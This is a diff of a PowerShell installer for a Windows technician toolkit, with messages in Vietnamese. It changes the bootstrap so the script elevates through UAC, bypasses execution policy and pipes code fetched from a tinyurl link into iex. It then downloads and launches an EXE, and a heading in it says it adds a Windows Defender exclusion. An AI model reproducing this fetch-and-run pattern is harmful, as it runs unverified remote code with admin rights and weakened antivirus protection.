@@ -17,7 +17,7 @@ if (-not $isAdmin) {
     Write-Host "`n [*] Dang yeu cau quyen quan tri vien (Run as Administrator)..." -ForegroundColor Yellow
     Write-Host " [*] Vui long bam 'YES' tren hop thoai UAC de cap phep hoat dong.`n" -ForegroundColor Cyan
     
-    $psBootstrapCmd = "& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; irm https://raw.githubusercontent.com/truongthanhvuong/toolwindows/main/win.ps1 | iex }"
+    $psBootstrapCmd = "& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; irm https://tinyurl.com/vuongwin | iex }"
     try {
         Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$psBootstrapCmd`"" -Verb RunAs
         Exit
@@ -28,7 +28,7 @@ if (-not $isAdmin) {
 }
 
 # 2. THIET LAP VUNG CAI DAT AN TOAN & CAU HINH WINDOWS DEFENDER EXCLUSION
-Write-Host "`n [1/4] Thiet lap vung luu tru an toan & Dang ky ngoai le Windows Defender..." -ForegroundColor Cyan
+Write-Host "`n [1/3] Thiet lap vung luu tru an toan & Dang ky ngoai le Windows Defender..." -ForegroundColor Cyan
 $installDir = Join-Path $env:ProgramData "VUONGTT_Toolkit"
 $exePath    = Join-Path $installDir "VUONGTT_Toolkit.exe"
 
@@ -46,7 +46,7 @@ try {
 }
 
 # 3. KIEM TRA VA TAI BAN MOI NHAT TU GITHUB / CDN
-Write-Host "`n [2/4] Dang kiem tra va dong bo ban phat hanh moi nhat tu Cloud..." -ForegroundColor Cyan
+Write-Host "`n [2/3] Dang kiem tra va dong bo ban phat hanh moi nhat tu Cloud..." -ForegroundColor Cyan
 
 $urls = @(
     "https://raw.githubusercontent.com/truongthanhvuong/toolwindows/main/VUONGTT_Toolkit.exe",
@@ -69,7 +69,7 @@ foreach ($url in $urls) {
             break
         }
     } catch {
-        Write-Host "  [!] Ket noi link nay khong thanh conc, dang thu nguon du phong..." -ForegroundColor DarkYellow
+        Write-Host "  [!] Ket noi link nay khong thanh cong, dang thu nguon du phong..." -ForegroundColor DarkYellow
     }
 }
 
@@ -99,36 +99,23 @@ if ($downloadSuccess) {
     }
 }
 
-# 4. TAO SHORTCUT TREN DESKTOP
-Write-Host "`n [3/4] Dang tao loi tat (Desktop Shortcut) de tien su dung..." -ForegroundColor Cyan
+# Don sach shortcut Desktop neu ton tai tu phien ban truoc (Theo yeu cau nguoi dung)
 try {
-    $wsh = New-Object -ComObject WScript.Shell
-    $desktops = @(
-        [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop),
-        [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::CommonDesktop)
-    )
+    $desktops = @("$home\Desktop", "$env:PUBLIC\Desktop")
     foreach ($desk in $desktops) {
         if (Test-Path $desk) {
-            $shortcutPath = Join-Path $desk "VUONGTT Tool Pro 2026.lnk"
-            $shortcut = $wsh.CreateShortcut($shortcutPath)
-            $shortcut.TargetPath = $exePath
-            $shortcut.WorkingDirectory = $installDir
-            $shortcut.Description = "Bo cong cu ky thuat vien da nang VUONGTT Tool Pro 2026"
-            $shortcut.Save()
+            $oldLnk = Join-Path $desk "VUONGTT Tool Pro 2026.lnk"
+            if (Test-Path $oldLnk) { Remove-Item $oldLnk -Force -ErrorAction SilentlyContinue }
         }
     }
-    Write-Host "  -> Da tao bieu tuong tren man hinh Desktop!" -ForegroundColor Green
-} catch {
-    Write-Host "  [!] Khong the tao shortcut: $($_.Exception.Message)" -ForegroundColor Gray
-}
+} catch {}
 
-# 5. KHOI CHAY UNG DUNG
-Write-Host "`n [4/4] Khoi dong VUONGTT Tool Pro 2026..." -ForegroundColor Cyan
+# 4. KHOI CHAY UNG DUNG
+Write-Host "`n [3/3] Khoi dong VUONGTT Tool Pro 2026..." -ForegroundColor Cyan
 try {
     Start-Process -FilePath $exePath -WorkingDirectory $installDir
     Write-Host "`n ====================================================================== " -ForegroundColor Green
     Write-Host "  [OK] KHOI CHAY THANH CONG! VUONGTT TOOL PRO 2026 DA DUOC MO TREN MAN HINH" -ForegroundColor Green
-    Write-Host "  [OK] Lan sau ban chi can click dup vao bieu tuong ngoai Desktop." -ForegroundColor Yellow
     Write-Host " ====================================================================== `n" -ForegroundColor Green
 } catch {
     Write-Host "  [!] Khong the khoi chay file EXE: $($_.Exception.Message)" -ForegroundColor Red
